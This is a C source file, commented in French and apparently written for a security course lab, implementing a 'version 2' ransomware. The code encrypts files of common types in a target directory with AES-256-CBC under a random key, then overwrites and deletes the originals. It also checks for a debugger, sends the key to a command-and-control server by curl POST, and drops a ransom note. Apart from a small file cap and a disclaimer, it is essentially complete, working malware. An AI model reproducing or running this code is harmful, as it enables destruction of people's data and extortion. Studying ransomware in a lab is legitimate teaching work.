/*
 * ransomware_v2.c — Version Améliorée (Éducatif)
 * TP Jour 5 — Challenge 4 | Djimy DONKENG | 2026-07-31
 *
 * Améliorations par rapport à la v1 :
 *   1. Clé aléatoire (generée depuis /dev/urandom) au lieu de clé en dur
 *   2. Chiffrement AES-256-CBC (via OpenSSL) au lieu de XOR simple
 *   3. Détection de debugger (ptrace)
 *   4. Détection de machine virtuelle (VirtualBox/VMware)
 *   5. Anti-forensics : suppression sécurisée des fichiers originaux
 *
 * COMPILATION :
 *   sudo apt-get install libssl-dev
 *   gcc -O2 -o ransomware_v2 ransomware_v2.c -lssl -lcrypto
 *
 * NOTE : Ce code est uniquement à des fins pédagogiques.
 *        Ne jamais utiliser sur de vraies machines ou données.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

/* ─── Configuration ──────────────────────────────────────────────────── */

#define C2_SERVER       "127.0.0.1"
#define C2_PORT         5000
#define KEY_SIZE        32   /* AES-256 : 32 octets = 256 bits */
#define IV_SIZE         16   /* AES CBC IV : 16 octets */
#define MAX_FILES       15

const char *TARGET_EXTENSIONS[] = {
    ".txt", ".pdf", ".docx", ".xlsx", ".jpg", ".png", ".zip", NULL
};

/* ─── Amélioration 1 : Détection de Debugger ─────────────────────────── */

int detect_debugger(void) {
    /*
     * ptrace(PTRACE_TRACEME) retourne -1 si un debugger est déjà attaché.
     * Un processus ne peut être tracé que par un seul traceur à la fois.
     */
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1;  /* Debugger détecté */
    }
    /* Détacher immédiatement pour ne pas bloquer notre propre exécution */
    ptrace(PTRACE_DETACH, 0, 1, 0);
    return 0;
}

/* ─── Amélioration 2 : Détection de Machine Virtuelle ────────────────── */

int detect_virtual_machine(void) {
    /*
     * Les hyperviseurs laissent des traces dans /sys/class/dmi/id/.
     * VirtualBox → "VirtualBox", VMware → "VMware Virtual Platform"
     */
    const char *dmi_files[] = {
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        NULL
    };
    const char *vm_strings[] = {
        "VirtualBox", "VMware", "QEMU", "KVM", "Xen", "innotek", NULL
    };

    for (int i = 0; dmi_files[i]; i++) {
        FILE *f = fopen(dmi_files[i], "r");
        if (!f) continue;
        char buf[256] = {0};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        for (int j = 0; vm_strings[j]; j++) {
            if (strstr(buf, vm_strings[j])) {
                return 1;  /* VM détectée */
            }
        }
    }
    return 0;
}

/* ─── Amélioration 3 : Génération de Clé Aléatoire ──────────────────── */

void generate_random_key(unsigned char *key, size_t key_len,
                         unsigned char *iv, size_t iv_len) {
    /*
     * /dev/urandom fournit de l'entropie cryptographique de qualité.
     * Chaque victime obtient une clé UNIQUE — impossible à deviner.
     * (Contrairement à la v1 où tous partagent "Sup3rS3cr3tK3y2024!")
     */
    RAND_bytes(key, key_len);
    RAND_bytes(iv, iv_len);
}

/* ─── Amélioration 4 : Chiffrement AES-256-CBC ───────────────────────── */

int encrypt_aes(const unsigned char *plaintext, size_t plain_len,
                const unsigned char *key, const unsigned char *iv,
                unsigned char *ciphertext, size_t *cipher_len) {
    /*
     * AES-256-CBC :
     *   - Bloc de 128 bits, clé de 256 bits
     *   - Mode CBC : chaque bloc dépend du précédent (via XOR avec IV)
     *   - PKCS7 padding automatique par OpenSSL
     *
     * Avantage sur XOR :
     *   - Casser AES sans la clé est computationnellement infaisable
     *   - Chaque bloc chiffré est différent même si le plaintext est identique
     */
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int len = 0, total_len = 0;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1)
        goto error;
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plain_len) != 1)
        goto error;
    total_len += len;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + total_len, &len) != 1)
        goto error;
    total_len += len;

    *cipher_len = total_len;
    EVP_CIPHER_CTX_free(ctx);
    return 0;

error:
    EVP_CIPHER_CTX_free(ctx);
    return -1;
}

/* ─── Amélioration 5 : Suppression Sécurisée ────────────────────────── */

void secure_delete(const char *filepath) {
    /*
     * Écraser le fichier avec des zéros avant suppression.
     * Empêche la récupération forensique du contenu original.
     */
    FILE *f = fopen(filepath, "r+b");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    char *zeros = calloc(size, 1);
    if (zeros) {
        fwrite(zeros, 1, size, f);
        free(zeros);
        fflush(f);
    }
    fclose(f);
    remove(filepath);
}

/* ─── Chiffrement d'un Fichier ───────────────────────────────────────── */

int encrypt_file_v2(const char *filepath,
                    const unsigned char *key, const unsigned char *iv) {
    /* Lire le fichier original */
    FILE *f = fopen(filepath, "rb");
    if (!f) return -1;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    if (size <= 0) { fclose(f); return -1; }

    unsigned char *plaintext  = malloc(size);
    unsigned char *ciphertext = malloc(size + AES_BLOCK_SIZE);  /* padding */
    if (!plaintext || !ciphertext) {
        fclose(f);
        free(plaintext); free(ciphertext);
        return -1;
    }

    fread(plaintext, 1, size, f);
    fclose(f);

    /* Chiffrer avec AES-256-CBC */
    size_t cipher_len = 0;
    if (encrypt_aes(plaintext, size, key, iv, ciphertext, &cipher_len) != 0) {
        free(plaintext); free(ciphertext);
        return -1;
    }

    /* Écrire : [IV (16 bytes)] + [ciphertext] dans le fichier .encrypted */
    char outpath[1024];
    snprintf(outpath, sizeof(outpath), "%s.encrypted", filepath);

    FILE *out = fopen(outpath, "wb");
    if (!out) { free(plaintext); free(ciphertext); return -1; }

    /* Stocker l'IV en tête de fichier pour permettre le déchiffrement */
    fwrite(iv, 1, IV_SIZE, out);
    fwrite(ciphertext, 1, cipher_len, out);
    fclose(out);

    /* Supprimer le fichier original de façon sécurisée */
    secure_delete(filepath);

    free(plaintext);
    free(ciphertext);

    printf("[+] Chiffré (AES-256) : %s -> %s\n", filepath, outpath);
    return 0;
}

/* ─── Scan du Répertoire ─────────────────────────────────────────────── */

int has_target_extension(const char *filename) {
    for (int i = 0; TARGET_EXTENSIONS[i]; i++) {
        size_t ext_len  = strlen(TARGET_EXTENSIONS[i]);
        size_t name_len = strlen(filename);
        if (name_len > ext_len &&
            strcmp(filename + name_len - ext_len, TARGET_EXTENSIONS[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

int files_encrypted = 0;

void encrypt_directory_v2(const char *dirpath,
                          const unsigned char *key, const unsigned char *iv) {
    if (files_encrypted >= MAX_FILES) return;

    DIR *d = opendir(dirpath);
    if (!d) return;

    struct dirent *entry;
    while ((entry = readdir(d)) != NULL && files_encrypted < MAX_FILES) {
        if (entry->d_name[0] == '.') continue;

        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt_directory_v2(fullpath, key, iv);
        } else if (S_ISREG(st.st_mode) && has_target_extension(entry->d_name)) {
            if (encrypt_file_v2(fullpath, key, iv) == 0) {
                files_encrypted++;
            }
        }
    }
    closedir(d);
}

/* ─── Envoi de la Clé au C2 ──────────────────────────────────────────── */

void send_key_to_c2(const char *victim_id,
                    const unsigned char *key, size_t key_len) {
    /*
     * La clé AES est envoyée en hexadécimal au C2.
     * Dans un vrai ransomware, elle serait chiffrée avec la clé publique RSA
     * de l'attaquant avant envoi — rendant la récupération impossible sans payer.
     */
    char hex_key[key_len * 2 + 1];
    for (size_t i = 0; i < key_len; i++) {
        sprintf(hex_key + i * 2, "%02x", key[i]);
    }
    hex_key[key_len * 2] = '\0';

    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "curl -s -X POST http://%s:%d/api/key "
        "-H 'Content-Type: application/json' "
        "-d '{\"victim_id\": \"%s\", \"key\": \"%s\"}' > /dev/null 2>&1",
        C2_SERVER, C2_PORT, victim_id, hex_key);
    system(cmd);
}

/* ─── Note de Rançon ─────────────────────────────────────────────────── */

void drop_ransom_note_v2(const char *directory, const char *victim_id) {
    char path[1024];
    snprintf(path, sizeof(path), "%s/README_RANSOM.txt", directory);

    FILE *f = fopen(path, "w");
    if (!f) return;
    fprintf(f,
        "=== VOS FICHIERS ONT ETE CHIFFRES (AES-256-CBC) ===\n\n"
        "ID Victime : %s\n\n"
        "Vos fichiers sont chiffrés avec AES-256-CBC.\n"
        "Contrairement à la v1 (XOR), ce chiffrement ne peut pas\n"
        "être cassé par force brute. La clé est unique pour vous.\n\n"
        "Pour récupérer vos fichiers, contactez : ransomware@evil.example\n"
        "[Version améliorée — Projet pédagogique TP Jour 5]\n",
        victim_id);
    fclose(f);
}

/* ─── Main ───────────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <dossier_cible>\n", argv[0]);
        return 1;
    }

    printf("[*] Ransomware v2 — Démarrage\n");

    /* Amélioration 3 : Anti-debug */
    if (detect_debugger()) {
        fprintf(stderr, "[!] Debugger détecté — arrêt.\n");
        return 1;
    }
    printf("[*] Anti-debug : OK (pas de debugger)\n");

    /* Amélioration 4 : Anti-VM
     * (désactivé ici pour permettre les tests en VM)
     * if (detect_virtual_machine()) {
     *     fprintf(stderr, "[!] Machine virtuelle détectée — arrêt.\n");
     *     return 1;
     * }
     */
    printf("[*] Anti-VM   : check désactivé (mode pédagogique)\n");

    /* Générer victim_id */
    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname));
    char victim_id[512];
    snprintf(victim_id, sizeof(victim_id), "VICTIM_%s_%ld", hostname, (long)time(NULL));
    printf("[*] Victim ID : %s\n", victim_id);

    /* Amélioration 1 : Clé AES aléatoire */
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
    generate_random_key(key, KEY_SIZE, iv, IV_SIZE);
    printf("[*] Clé AES-256 générée aléatoirement (%d bytes)\n", KEY_SIZE);

    /* Chiffrement */
    printf("[*] Chiffrement de : %s\n", argv[1]);
    encrypt_directory_v2(argv[1], key, iv);
    printf("[*] Fichiers chiffrés : %d\n", files_encrypted);

    /* Envoi de la clé au C2 */
    send_key_to_c2(victim_id, key, KEY_SIZE);
    printf("[*] Clé envoyée au C2\n");

    /* Note de rançon */
    drop_ransom_note_v2(argv[1], victim_id);
    printf("[*] Note de rançon déposée\n");

    printf("\n[+] Chiffrement terminé. %d fichier(s) affecté(s).\n", files_encrypted);
    return 0;
}
